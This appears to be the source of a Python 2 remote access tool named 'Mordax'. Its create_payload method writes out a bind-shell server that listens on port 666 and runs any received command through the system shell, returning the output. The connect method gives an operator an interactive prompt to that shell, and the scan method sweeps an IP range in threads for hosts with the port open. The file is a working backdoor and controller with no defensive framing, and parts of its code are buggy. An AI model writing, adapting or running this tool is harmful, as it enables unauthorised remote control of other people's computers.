# This Python file uses the following encoding: utf-8
import socket
import threading
import Compiler
from tqdm import tqdm
import Crypt


class Client(Compiler.Compile,Crypt.Crypt):

    def depad(self, msg):
        y = 0
        msg = list(msg)
        msgR = []
        for x in range(len(msg)):
            if msg[x] == " ":
                y += 1
            else:
                next
        for x in range(len(msg ) -y):
            msgR.append(msg[x])
        return("".join(msgR))

    def create_payload(self):
        iv = self.KeyAndIv("8s6Ge9dd", "OVbfVVRciZNgcObT")
        print(iv)

        code = ['import socket\n', 'import subprocess\n', 'import os\n', 'import sys\n',
                'host = ""\n', 'port = 666\n', 'import threading\n', '\n', 'class Mordax():\n',
                '    def __init__(self):\n', '        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n',
                '        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n',
                '        self.s.bind((host, port))\n', '        self.s.listen(3)\n', '\n',
                '    def start(self):\n', '        self.connection, self.addr = self.s.accept()\n',
                '        if self.connection and self.addr:\n', '            connect = threading.Thread(target=self.server)\n',
                '            connect.start()\n', '            self.start()\n', '\n',
                '    def server(self):\n', '\n', '        print(self.addr[0])\n', '\n',
                '        while True:\n', '\n', '            try:\n', '                data = self.connection.recv(2048)\n',
                '                if data[:2] == "cd":\n', '                    path = data[3:]\n',
                '                    try:\n', '                        os.chdir(data[3:])\n',
                '                    except Exception:\n', '                        mmm = 1\n', '\n',
                '                if data[3:] == "dir":\n', '                    os.listdir(path)\n',
                '\n', '                if len(data) > 0:\n', '                    if data == "close":\n',
                '                        print("close")\n', '                        self.s.close()\n',
                '                        self.connection.close()\n', '                        self.server()\n',
                '                    cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n',
                '                    stdout = cmd.stdout.read() + cmd.stderr.read() + ";" + os.getcwd()\n',
                '                    size = sys.getsizeof(stdout)\n', '                    if size > 2048:\n',
                '                        size = sys.getsizeof(stdout)\n', '                        size = str(size)\n',
                '                        self.connection.send("SIZE" + "; " + size)\n', '                        self.connection.send(stdout)\n',
                '                    else:\n', '                        self.connection.send(stdout)\n', '            except socket.error as error:\n',
                '                self.connection.close()\n', '                self.connection, addr = self.s.accept()\n', '                print(addr)\n',
                '\n', '\n', '\n', 'Server = Mordax()\n', 'Server.start()']

        with open ("Payload.txt", "r+") as file:


            for x in code:
                file.write(x)

            try:
                self.check("Payload.py")
            except Exception as E:
                print(E)


    def connect(self, host):

        State = 1
        port = 666
        timeout = 0



        if host != 0:
            host = host
        else:
            host = raw_input("IP: ")
            host = str(host)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while State == True:

            try:
                s.connect((host,port))
            except Exception:
                print("server is offline")
                timeout = timeout+1
                if timeout == 5:
                   exit()
            else:
                State = 0
        iv = self.KeyAndIv("mordax", 0)
        s.send(iv)
        text = "<command:>"
        SIZE = 2048

        while True:

            cmd = raw_input(text)

            if cmd == "close":
                s.send("close")
                s.close()
                exit()

            s.send(self.encode(cmd))
            data = self.decode(s.recv(2048))
            data = data.split(";")

            if data[0] == "SIZE":
                data[1] = int(data[1])
                data2 = s.recv(data[1])
                data2 = data2.split(";")
                print (data2[0])
                text = data2[1] + ">"
            else:
                print data[0]
                text = self.depad(data[1])
                text = text + ">"

    def scan(self, args):

       start = raw_input("Start IP: ")
       stop = raw_input("Stop IP: ")
       self.args = args

       ip1 = start.split(".")
       self.ip2 = stop.split(".")
       self.iprange = ip1[0] + "." + ip1[1] + "." + ip1[2] + "."

       tip = int(ip1[3])
       t1ip = int(ip1[3]) + 1
       t2ip = int(ip1[3]) + 2
       t3ip = int(ip1[3]) + 3
       t4ip = int(ip1[3]) + 4
       t5ip = int(ip1[3]) + 5
       t6ip = int(ip1[3]) + 6
       t7ip = int(ip1[3]) + 7

       t1 = threading.Thread(target=self.sscan, args=(tip,"9","0",))
       t2 = threading.Thread(target=self.sscan, args=(t1ip,"9","1",))
       t3 = threading.Thread(target=self.sscan, args=(t2ip,"9","2",))
       t4 = threading.Thread(target=self.sscan, args=(t3ip,"9","3",))
       t5 = threading.Thread(target=self.sscan, args=(t4ip,"9","4",))
       t6 = threading.Thread(target=self.sscan, args=(t5ip,"9","5",))
       t7 = threading.Thread(target=self.sscan, args=(t6ip,"9","6",))
       t8 = threading.Thread(target=self.sscan, args=(t7ip,"9","7",))

       t1.start()
       t2.start()
       t3.start()
       t4.start()
       t5.start()
       t6.start()
       t7.start()
       t8.start()


    def sscan(self ,strange,srange,thread):

        try:

            srange = self.ip2[3]
            step = 9

            for x in tqdm(range(strange,int(srange),int(step))):
                if x < 10:
                    x = str(x)
                    x = "0" + x
                elif x >= 10:
                    x = str(x)

                ip = self.iprange + x

                if self.args == "log":
                    ip = str(ip)
                    print("scanning with thread " + thread + " targetting IP: " + ip +"\n")
                else:
                    next

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                res = s.connect_ex((ip,666))

                for timeout in range(0, 5):
                    if res == 0:
                        print (ip + " is online")

        except Exception():

            print(Exception)

